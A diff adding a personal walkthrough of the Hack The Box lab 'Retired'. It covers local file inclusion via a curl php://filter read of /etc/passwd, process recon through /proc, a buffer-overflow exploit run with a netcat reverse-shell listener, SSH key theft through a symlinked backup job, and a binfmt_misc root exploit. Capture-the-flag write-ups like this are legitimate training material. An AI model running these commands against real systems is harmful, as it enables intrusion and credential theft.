@@ -1,0 +1,43 @@
+Found a LFI vulnerability on the main page:
+	http://retired.htb/index.php?page=[HERE GOES THE ATTACK]
+Realize the attack with curl 'cause if you do it from web is going to redirect the page
+	### curl -kis http://retired.htb/index.php?page=php://filter/resource=/etc/passwd ###
+
+Found beta.html & activate_license.php. On the beta.html there was a file upload that says "A license files contains a 512 bit key"
+so it was quite obvious that i was dealing with a buffer overflow attack.
+
+Since i couldn't use the LFI vulnerability to get RCE i used it to do more recon and found these files:
+	@@ /activate_license.php @@
+		In this file i understood better how it works the file upload (on Logs2 you can found the beta.html & activate_license.php)
+
+	@@ /proc/sched_debug @@
+		This is the file that shows the running process and inside this file i found the pid to "activate_license"
+	
+	@@ /proc/[activate_license-pid]/maps @@
+		Here i found which libraries was using so now i was able to do or search an exploit.
+
+	### python exploit.py [my-ip] [my-port] ####
+	On another terminal
+	### nc -lvnp [my-port] ### 
+
+USER-PRIV-ESCALATION:
+
+	The user 'dev' was running /usr/bin/webbackup/ which takes a backup of the /var/www/html folder so i just have to create a
+	symlink that points to the ssh dev's key	(the file webbackup shows whats inside of /usr/bin/webbakup)
+
+	On the /var/www/html folder:
+		### ln -s /home/dev/.ssh/id_rsa ssh-key ###
+	Move the backup from /var/www to /dev/shm/ (this is just to have a cleaner space tu unzip it)
+	Unzip it and you will find the file.
+	(There will be like 3 or 4 zip files, You'll probably find the ssh-key on the last 2 of them)
+
+	copy the file to your machine and do the next:
+		### chmod 400 ssh-key-file ###
+		### ssh dev@retired.htb -i ssh-key-file ###
+
+ROOT-PRIV-ESCALATION:
+	In the beginning we were told that this was about a software emulator called "emuemu" and in the dev's home there is a folder
+	called "emuemu" inside this folder there is a file called "reg_helper.c" that points to a function on the system that is
+	"binfmt_misc". I search for a exploit and execute it, with this a get root priv.
+
+	The exploit is "/binfmt_misc/binfmt-exploit" not the "binfmt-rootkit"
